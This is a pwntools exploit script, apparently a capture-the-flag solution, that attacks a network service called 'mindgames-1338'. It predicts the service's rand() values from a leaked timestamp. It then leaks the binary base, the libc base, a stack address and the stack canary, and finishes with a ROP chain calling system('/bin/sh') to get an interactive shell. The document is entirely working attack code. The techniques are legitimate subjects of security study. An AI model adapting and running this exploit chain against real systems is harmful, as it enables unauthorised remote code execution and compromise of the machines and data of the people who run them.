#!/usr/bin/env python3

from datetime import datetime
from ctypes import CDLL
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
fixleak = lambda l: unpack(l[:-1].ljust(8, b"\x00"))

encode = lambda e: e if type(e) == bytes else str(e).encode()

exe = "./mindgames-1338"
elf = context.binary = ELF(exe)
libc = ELF('libc.so.6')
C = CDLL('libc.so.6')
io = process()
if args.GDB: gdb.attach(io, """
    b *main
""")

io = remote("mindgames.secenv", 1338)

def menu(idx: int):
    io.sendlineafter(b">", encode(idx))

def get_leak(payload, parse=True):
    io.sendafter(b'name: ', payload)
    menu(1)
    io.recvuntil(b"highscore:")
    io.recvuntil(b"\t by \t ")
    leak = io.recvline()
    return fixleak(leak) if parse else leak[:-1]

def bypassranval(extra=False):
    if extra: C.rand()
    menu(2)
    menu(C.rand())
    for i in range(highscore):
        menu(C.rand())
    menu(1234)


strdate = re.findall(b"[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}", io.recvline())[0].decode()
epoch = datetime.strptime(strdate+'-+0000',"%Y-%m-%d %H:%M:%S-%z").timestamp()

# C.srand(int(epoch) - 18000)
C.srand(int(epoch))
randval = C.rand()
highscore = (C.rand() % 32) + 1
info(f"Highscore: {highscore}")

bypassranval()
highscore = 2

#==================Finding Binary Base address=====================
payload = flat(
    cyclic(32, n=8),
    0x1,
    b"\xe8"
)
leaked_pie = get_leak(payload)
elf.address = leaked_pie  - 0x40e8
info("leaked pie @ %#x " % leaked_pie)
info("elf base @ %#x" % elf.address)

bypassranval(extra=True)

#===============Finding libc base addresss==========================
payload = flat(
    cyclic(32, n=8),
    0x1,
    elf.got.puts
)
puts = get_leak(payload)
info("leaked puts @ %#x " % puts)
libc.address = puts - libc.sym.puts
# libc.address = puts - 0x83630
info("libc base @ %#x " % libc.address)

bypassranval(extra=True)

# gdb.attach(io)    

#====================Bypassing canary mitigation====================
payload = flat(
    cyclic(32, n=8),
    0x1,
    libc.sym.environ
)
stack = get_leak(payload)

info("stack @ %#x" % stack)

bypassranval(extra=True)

payload = flat(
    cyclic(32, n=8),
    0x1,
    stack - (0x90-0x1) # -1 so that the last byte of canary i.e. 00 is skipped to avoid printf ending
)
canary = unpack(get_leak(payload, parse=False).rjust(8, b"\x00"))
info("canary  @ %#x" % canary)

#================= Now we will bypass NX bit =====================
bypassranval(extra=True)
rop = ROP(libc)
payload = flat(
    cyclic(0x108, n=8),
    canary,
    cyclic(0x8, n=8),
    
    rop.rdi.address,
    next(libc.search(b"/bin/sh\x00")),
    rop.ret.address,
    libc.sym.system
)
io.sendlineafter(b"name: ", payload)

io.interactive()
